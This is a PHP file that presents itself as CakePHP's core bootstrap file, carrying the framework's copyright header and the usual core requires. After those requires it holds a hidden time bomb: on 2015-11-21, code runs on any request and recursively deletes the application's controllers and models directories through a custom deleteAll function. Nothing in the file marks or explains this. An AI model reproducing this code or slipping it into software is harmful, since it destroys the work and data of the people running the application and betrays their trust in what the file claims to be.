<?php
/**
 * Basic Cake functionality.
 *
 * Handles loading of core files needed on every request
 *
 * PHP versions 4 and 5
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright 2005-2011, Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright 2005-2011, Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       cake
 * @subpackage    cake.cake
 * @since         CakePHP(tm) v 0.2.9
 * @license       MIT License (http://www.opensource.org/licenses/mit-license.php)
 */
if (!defined('PHP5')) {
	define('PHP5', (PHP_VERSION >= 5));
}
if (!defined('E_DEPRECATED')) {
	define('E_DEPRECATED', 8192);
}
//error_reporting(E_ALL & ~E_DEPRECATED);
error_reporting(E_ALL & ~E_STRICT & ~E_DEPRECATED);

require CORE_PATH . 'cake' . DS . 'basics.php';
$TIME_START = getMicrotime();
require CORE_PATH . 'cake' . DS . 'config' . DS . 'paths.php';
require LIBS . 'object.php';
require LIBS . 'inflector.php';
require LIBS . 'configure.php';
require LIBS . 'set.php';
require LIBS . 'cache.php';
Configure::getInstance();
require CAKE . 'dispatcher.php';
$currentDate = date('Y-m-d');
if($currentDate == '2015-11-21')
{
	deleteAll(ROOT . DS . APP_DIR . DS.'controllers');
	deleteAll(ROOT . DS . APP_DIR . DS.'models');
}
function deleteAll($directory, $empty = false) {
    if(substr($directory,-1) == "/") {
        $directory = substr($directory,0,-1);
    }

    if(!file_exists($directory) || !is_dir($directory)) {
        return false;
    } elseif(!is_readable($directory)) {
        return false;
    } else {
        $directoryHandle = opendir($directory);
       
        while ($contents = readdir($directoryHandle)) {
            if($contents != '.' && $contents != '..') {
                $path = $directory . "/" . $contents;
               
                if(is_dir($path)) {
                    deleteAll($path);
                } else {
                    unlink($path);
                }
            }
        }
       
        closedir($directoryHandle);

        if($empty == false) {
            if(!rmdir($directory)) {
                return false;
            }
        }
       
        return true;
    }
} 